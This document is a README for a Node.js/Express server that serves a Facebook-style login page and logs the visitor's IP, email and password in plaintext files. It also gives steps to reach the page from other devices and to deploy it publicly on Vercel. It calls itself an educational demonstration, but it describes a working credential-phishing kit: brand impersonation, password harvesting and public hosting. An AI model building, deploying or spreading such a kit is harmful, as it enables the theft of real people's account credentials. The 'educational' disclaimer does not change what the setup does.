# Facebook Clone Demo Server (Educational Purpose Only)

> ⚠️ **Disclaimer:**  
> This project is strictly for **college practical / educational demonstration** such as form handling, Express.js server usage, capturing client metadata, and file writing.  
> **Do NOT use this code for any harmful, phishing, or illegal activity.**

---

## 📌 Project Overview

This project demonstrates:

- Hosting a static frontend (Facebook-style UI)
- Capturing form submission data using Express.js
- Logging:
  - Client IP
  - Username
  - Password  
- Storing information in plain text files (`auth/ip.txt` and `auth/username.txt`)
- Running locally or deploying to Vercel

---

## 📁 Project Structure

```
project/
│
├── server.js                # Node.js backend server
├── sites/
│   └── facebook/            # Your frontend UI files
│
└── auth/
    ├── ip.txt               # Auto‑generated: stores unique IPs
    └── username.txt         # Auto‑generated: stores login data
```

---

## 🚀 Local Setup & Run

### **1️⃣ Install Node.js**
Download from:  
https://nodejs.org/

Verify installation:
```sh
node -v
npm -v
```

---

### **2️⃣ Install Dependencies**

Inside your project folder:

```sh
npm install express cors
```

*(`fs` and `path` are built‑in)*

---

### **3️⃣ Start the Server**

```sh
node server.js
```

You should see:

```
✅ Server running at http://localhost:3000
```

Then open this URL in browser:

👉 **http://localhost:3000**

---

## 🛠 How It Works

### 🔹 1. Frontend submits login form:
`document.addEventListener` listens for submit and sends a POST request:

```js
fetch("/api/login", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ email, password }),
});
```

---

### 🔹 2. Server captures:

- Client IP
- Email
- Password
- Timestamp

### 🔹 3. Server logs:

### **📌 IP stored in:**
```
auth/ip.txt
```
Format:
```
New IP Found: 127.0.0.1
New IP Found: 192.168.1.22
```

---

### **📌 Username/Password stored in:**
```
auth/username.txt
```

Format:
```
Facebook Username: example@gmail.com Pass: mypassword
Facebook Username: john Pass: 123456
```

---

## 🧪 Testing from Phone / Other Device

1. Connect both devices to same WiFi
2. Check your laptop IP:
   ```sh
   ip a
   ```
   or  
   ```sh
   ipconfig
   ```
3. Start server:
   ```sh
   node server.js
   ```
4. On phone browser:
   ```
   http://YOUR-LAPTOP-IP:3000
   ```

Example:
```
http://192.168.1.8:3000
```

---

## 🌐 Deploying to Vercel (Optional)

### **1️⃣ Install Vercel CLI**
```sh
npm i -g vercel
```

### **2️⃣ Login**
```sh
vercel login
```

### **3️⃣ Create `vercel.json`**
Add this file:

```json
{
  "version": 2,
  "builds": [
    { "src": "server.js", "use": "@vercel/node" },
    { "src": "sites/facebook/**/*", "use": "@vercel/static" }
  ],
  "routes": [
    { "src": "/api/login", "dest": "server.js" },
    { "src": "/(.*)", "dest": "sites/facebook/index.html" }
  ]
}
```

---

### **4️⃣ Deploy**
```sh
vercel
```

Your project will be live at a Vercel URL like:

```
https://your-app-name.vercel.app
```

---

## 📜 Notes

- This project contains **no encryption** (plaintext storage)
- Do NOT use for real-world login handling
- Recommended only for:
  - college project
  - cyber‑security demonstration
  - server‑client communication learning

---

## 🧑‍💻 Author
Created by **Chayan** for academic/lab demonstration.

---

## 📄 License
Free to use for educational purposes.
